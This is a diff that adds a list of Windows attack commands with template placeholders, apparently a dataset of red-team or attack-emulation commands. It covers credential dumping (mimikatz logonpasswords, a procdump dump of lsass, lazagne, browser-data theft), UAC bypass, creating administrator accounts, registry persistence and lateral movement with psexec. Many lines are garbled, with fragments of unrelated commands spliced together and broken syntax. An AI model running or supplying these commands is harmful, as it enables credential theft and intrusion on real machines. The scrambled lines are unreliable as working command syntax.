@@ -1,0 +1,64 @@
+$ shortcut.windowstyle = 1 ;
+hack-browser-data-windows-64bit.exe
+pktmon.exe start -- etw
+iediagcmd.exe /out : $ { domain }
+dig $ { input_folder_name }
+lazagne.exe windows -mscache
+net user administrator /domain
+get-ciminstance http : :createprocessfromparent ( powershell ) ;
+bypassuac.exe $ { binary_path }
+bitsadmin.exe /resume $ { domain
+1 $ ( username ) ;
+lazagne.exe windows -mscache
+net user $ { input_folder_name } $ { command }
+copy-item create /domain
+netsh.exe add helper $ { command }
+net user administrator /add
+reg add `` hklm\system\currentcontrolset\control\session userinit manager\environment '' `` reg_expand_sz /d `` service_name
+ffuf -w $ consumerargs
+-a `` kerberos : :logonpasswords
+nltest /domain_trusts
+rundll32 popcalc.dll , popcalc
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' '' /v `` cor_profiler '' '' ' ) -force /d `` $ { lsass_lib.dll_path } '' , `` $ { system32_binary } '' '' /f
+cmdkey /list
+hack-browser-data-windows-64bit.exe
+sharprdp.exe computername= $ { domain }
+net localgroup administrators '' $ { ip }
+sekurlsa : :logonpasswords
+quser
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v `` autorun '' '' 0 , 0 0 0 '' /launch `` $ { binary_path } ''
+.\procdump.exe -accepteula -mm lsass.exe c : \users\ `` $ : username } \appdata\local\temp\lsass.dmp full
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /v `` enabled '' -name `` 1 '' \windows\system32\sethc.exe
+get-localgroupmember -group users ''
+lsadump : write-host `` clearing $ : username ) /domain '' \software\microsoft\command = ; ;
+sc.exe create = `` $ { username } '' -force )
+nltest redirect.sdb
+powershell $ consumerargs dump
+psr.exe /start /output $ { firewall % temp % \system32\osk.exe
+add-localgroupmember -group `` administrators '' '' c : \programdata\microsoft\windows\start menu\programs\startup\atmoic.lnk '' '' ;
+rdrleakdiag.exe /p $ target service account user_name }
+set programw6432= $ { target } /user : $ { ntlm ) you consumerargs
+cmdkey.exe /list
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v shell -class -user /f
+vsdiagnostics.exe start $ { hklm\system\currentcontrolset\control\lsa\
+nbtstat -n
+`` hklm\software\microsoft\windows file `` -exec= $ : username }
+cmdkey.exe /list
+rundll32 $ : \windows\system32\
+assoc $ { domain }
+rubeus.exe $ /f `` users ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` hklm\system\currentcontrolset\control\print\environments\windows -namespace '' loadappinit_dlls '' '' ) '' activescripteventconsumer -arguments $ shortcut = `` $ i -w $ { copy } /krbtgt : $ i -count $ { mask }
+net user $ { lsass_pid } /domain : $ { input_folder_name }
+sekurlsa : :logonpasswords
+net user $ { shadow id name you ( ( copy path )
+.\procdump.exe -enabled = ( $ a ) ;
+psexec \\ { remote_host } -u $ { ntds.dit }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t dllname /d `` $ { command } ''
+quser
+get-item -path `` -p $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ; /y
+ren $ { interface }
+copy $ shell.createshortcut '' `` autodialdll '' $ { binary } '' $ { encoded reg_sz service . `` $ : i -o i @ $ { range_step } , `` psexec.exe \\ $ { remote_host } \appdata\local\temp\lsass.dmp
+bitsadmin.exe /setnotifycmdline $ { system file } , keylog
+$ create.save ( ) '' /f
+cmdkey /list
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v `` cor_profiler `` autorun '' '' `` threadingmodel '' /f
